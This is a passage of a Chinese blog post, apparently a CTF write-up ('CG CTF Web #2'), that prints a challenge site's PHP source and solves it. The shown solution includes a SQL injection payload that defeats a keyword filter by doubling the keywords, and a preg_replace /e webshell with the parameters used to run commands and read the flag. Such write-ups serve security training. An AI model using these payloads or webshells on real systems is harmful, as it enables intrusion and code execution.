+</span></span><span class="line"><span class="cl"> <span class="k">echo</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="s1">&#39;nice&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;</span><span class="o">.</span><span class="nx">antixss</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="s1">&#39;say&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;br /&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="nx">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nx">mysql_free_result</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nx">mysql_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></li>
+<li>
+<p>passencode.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">passencode</span><span class="p">(</span><span class="nv">$content</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//$pass=urlencode($content);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$array</span><span class="o">=</span><span class="nx">str_split</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">count</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$pass</span><span class="o">!=</span><span class="s2">&#34;&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$pass</span><span class="o">=</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$array</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$pass</span><span class="o">=</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$array</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nv">$pass</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></li>
+<li>
+<p>say.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;config.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$nice</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nice&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$say</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;usersay&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span><span class="nv">$nice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;userpass&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$userpass</span><span class="o">=</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;userpass&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$nice</span><span class="o">==</span><span class="s2">&#34;&#34;</span> <span class="o">||</span> <span class="nv">$say</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)&#39;);&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$con</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="nv">$db_address</span><span class="p">,</span><span class="nv">$db_user</span><span class="p">,</span><span class="nv">$db_pass</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;不能连接到数据库！！&#34;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysql_select_db</span><span class="p">(</span><span class="nv">$db_name</span><span class="p">,</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$nice</span><span class="o">=</span><span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$nice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$userpass</span><span class="o">=</span><span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$userpass</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysql_query</span><span class="p">(</span><span class="s2">&#34;SELECT username FROM admin where username=&#39;</span><span class="si">$nice</span><span class="s2">&#39;&#34;</span><span class="p">,</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$login</span><span class="o">=</span><span class="nx">mysql_query</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM admin where username=&#39;</span><span class="si">$username</span><span class="s2">&#39; AND userpass=&#39;</span><span class="si">$userpass</span><span class="s2">&#39;&#34;</span><span class="p">,</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">mysql_num_rows</span><span class="p">(</span><span class="nv">$login</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;昵称已被使用，请更换！&#39;);&lt;/script&gt;&#34;</span><span class="p">;</span> <span class="nx">mysql_free_result</span><span class="p">(</span><span class="nv">$login</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mysql_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysql_free_result</span><span class="p">(</span><span class="nv">$login</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$say</span><span class="o">=</span><span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$say</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysql_query</span><span class="p">(</span><span class="s2">&#34;insert into message (nice,say,display) values(&#39;</span><span class="si">$nice</span><span class="s2">&#39;,&#39;</span><span class="si">$say</span><span class="s2">&#39;,0)&#34;</span><span class="p">,</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysql_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;script&gt;alert(&#34;构建和谐社会，留言需要经过管理员审核才可以显示！&#34;);window.location = &#34;./index.php&#34;&lt;/script&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></li>
+<li>
+<p>preview.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$prenice</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nice&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$presay</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;usersay&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;antixss.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nx">antixss</span><span class="p">(</span><span class="nv">$presay</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$prenice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">antixss</span><span class="p">(</span><span class="nv">$presay</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></li>
+</ol>
+<p>发现了一些新的页面 ./antiinject.php ./antixss.php ./loginxlcteam/</p>
+<ol start="7">
+<li>antiinject.php
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">antiinject</span><span class="p">(</span><span class="nv">$content</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$keyword</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;select&#34;</span><span class="p">,</span><span class="s2">&#34;union&#34;</span><span class="p">,</span><span class="s2">&#34;and&#34;</span><span class="p">,</span><span class="s2">&#34;from&#34;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s2">&#34;;&#34;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s2">&#34;char&#34;</span><span class="p">,</span><span class="s2">&#34;or&#34;</span><span class="p">,</span><span class="s2">&#34;count&#34;</span><span class="p">,</span><span class="s2">&#34;master&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="s2">&#34;pass&#34;</span><span class="p">,</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;+&#34;</span><span class="p">,</span><span class="s2">&#34;-&#34;</span><span class="p">,</span><span class="s2">&#34;order&#34;</span><span class="p">,</span><span class="s2">&#34;=&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$info</span><span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;=</span><span class="nx">count</span><span class="p">(</span><span class="nv">$keyword</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$info</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="nv">$keyword</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$info</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$info</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></li>
+<li>antixss.php
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">antixss</span><span class="p">(</span><span class="nv">$content</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/(.*)\[a\](.*)\[\/a\](.*)/&#34;</span><span class="p">,</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$key</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;(&#34;</span><span class="p">,</span><span class="s2">&#34;)&#34;</span><span class="p">,</span><span class="s2">&#34;&amp;&#34;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;&#34;</span><span class="p">,</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s2">&#34;%28&#34;</span><span class="p">,</span><span class="s2">&#34;%29&#34;</span><span class="p">,</span><span class="s2">&#34; on&#34;</span><span class="p">,</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="s2">&#34;src&#34;</span><span class="p">,</span><span class="s2">&#34;eval&#34;</span><span class="p">,</span><span class="s2">&#34;unescape&#34;</span><span class="p">,</span><span class="s2">&#34;innerHTML&#34;</span><span class="p">,</span><span class="s2">&#34;document&#34;</span><span class="p">,</span><span class="s2">&#34;appendChild&#34;</span><span class="p">,</span><span class="s2">&#34;createElement&#34;</span><span class="p">,</span><span class="s2">&#34;write&#34;</span><span class="p">,</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="s2">&#34;setTimeout&#34;</span><span class="p">,</span><span class="s2">&#34;cookie&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i&lt;=count($key);$i++){ $re=str_replace($key[$i], &#39;_&#39;,$re); } return htmlspecialchars($url[1],ENT_QUOTES).&#39;&lt;a href=&#34;&#39;.$re.&#39;&#34;&gt;&#39;.$re.&#39;&lt;/a&gt;&#39;.htmlspecialchars($url[3],ENT_QUOTES); } }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></li>
+</ol>
+
+
+<h3 class="relative group">尝试对 so.php 进行 sql 注入 
+    <div id="%E5%B0%9D%E8%AF%95%E5%AF%B9-sophp-%E8%BF%9B%E8%A1%8C-sql-%E6%B3%A8%E5%85%A5" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%B0%9D%E8%AF%95%E5%AF%B9-sophp-%E8%BF%9B%E8%A1%8C-sql-%E6%B3%A8%E5%85%A5" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+<p>将 User-Angent 改为 Xlcteam Browser，提交参数 soid 开始注入。</p>
+<p>查询语句为 <code>SELECT * FROM </code>message<code> WHERE display=1 AND id=$id</code></p>
+<p>id 没有包裹引号，过滤规则双写即可绕过，因为是按顺序进行替换敏感词，因此在语句中插入 ‘=’ 也可</p>
+<p>构造 <code>soid=1/**/aandnd/**/0/**/uniunionon/**/seselectlect/**/1,2,3,4</code> 回显为 2，3。
+根据 admin 表结构一通注入 ，得到</p>
+<p><code>  admin   102 117 99 107 114 117 110 116 117</code></p>
+<p>密码转换出来后即可进入后台,提示有一个小马，使用 about.php 获取小马内容</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nv">$e</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;www&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;wtf&#39;</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="s1">&#39;|.*|e&#39;</span><span class="p">,);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">array_walk</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="nv">$e</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><pre><code>    //因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i&lt;=count($key);$i++){ $re=str_replace($key[$i], '_',$re); } return htmlspecialchars($url[1],ENT_QUOTES).'&lt;a href=&quot;'.$re.'&quot;&gt;'.$re.'&lt;/a&gt;'.htmlspecialchars($url[3],ENT_QUOTES); } }
+    //因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i&lt;=count($key);$i++){ $re=str_replace($key[$i], '_',$re); } return htmlspecialchars($url[1],ENT_QUOTES).'&lt;a href=&quot;'.$re.'&quot;&gt;'.$re.'&lt;/a&gt;'.htmlspecialchars($url[3],ENT_QUOTES); } }
+</code></pre>
+<blockquote>
+<p>数组的 value 中是|.*|e，这里用到了正则匹配的 preg_replace()的一个漏洞：</p>
+<p>参考 <a href="https://www.jb51.net/article/38714.htm" target="_blank">https://www.jb51.net/article/38714.htm</a></p>
+<p>简单来说就是正则中/e(这里和|e 效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。
+所以我们可以传递 preg_replace 给 www，这样 array 中的值就是第一个参数，键就是第二个参数，正好可以利用 preg_replace 的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。</p></blockquote>
+<p>url 里加入参数 www=preg_replace ,post 参数 wtf=print_r(scandir(.)) 列出目录，flag 所在文件名为 &lsquo;恭喜你获得 flag2.txt&rsquo; , 利用 about.php 读取即可。</p>
+
+          
+          
+          
+            <strong class="block mt-8">
+              <a target="_blank" 
+              class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+              href="mailto:wicsp@gmail.com?subject=Reply%20to%20CG%20CTF%20Web%20%232">
+                Reply by Email
+              </a>
+            </strong>
+          
+        </div>
+        
+        
+
+        
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/posts/cg-ctf-web-2/&amp;title=CG%20CTF%20Web%20#2"
+      title="分享到 LinkedIn"
+      aria-label="分享到 LinkedIn"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/posts/cg-ctf-web-2/&amp;text=CG%20CTF%20Web%20#2"
+      title="分享到 Twitter"
+      aria-label="分享到 Twitter"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://bsky.app/intent/compose?text=CG%20CTF%20Web%20#2&#43;http://localhost:1313/posts/cg-ctf-web-2/"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256,232.562c-21.183,-41.196 -78.868,-117.97 -132.503,-155.834c-51.378,-36.272 -70.978,-29.987 -83.828,-24.181c-14.872,6.72 -17.577,29.554 -17.577,42.988c0,13.433 7.365,110.138 12.169,126.281c15.873,53.336 72.376,71.358 124.413,65.574c2.66,-0.395 5.357,-0.759 8.089,-1.097c-2.68,0.429 -5.379,0.796 -8.089,1.097c-76.259,11.294 -143.984,39.085 -55.158,137.972c97.708,101.165 133.908,-21.692 152.484,-83.983c18.576,62.291 39.972,180.718 150.734,83.983c83.174,-83.983 22.851,-126.674 -53.408,-137.969c-2.71,-0.302 -5.409,-0.667 -8.089,-1.096c2.732,0.337 5.429,0.702 8.089,1.096c52.037,5.785 108.54,-12.239 124.413,-65.574c4.804,-16.142 12.169,-112.847 12.169,-126.281c-0,-13.434 -2.705,-36.267 -17.577,-42.988c-12.85,-5.806 -32.45,-12.09 -83.829,24.181c-53.634,37.864 -111.319,114.635 -132.502,155.831Z"/></svg>
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://s2f.kytta.dev/?text=CG%20CTF%20Web%20#2%20http://localhost:1313/posts/cg-ctf-web-2/"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://reddit.com/submit/?url=http://localhost:1313/posts/cg-ctf-web-2/&amp;resubmit=true&amp;title=CG%20CTF%20Web%20#2"
+      title="提交到 Reddit"
+      aria-label="提交到 Reddit"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/posts/cg-ctf-web-2/&amp;description=CG%20CTF%20Web%20#2"
+      title="钉到 Pinterest"
+      aria-label="钉到 Pinterest"
+      >
+      
+
+  <span class="relative block icon">
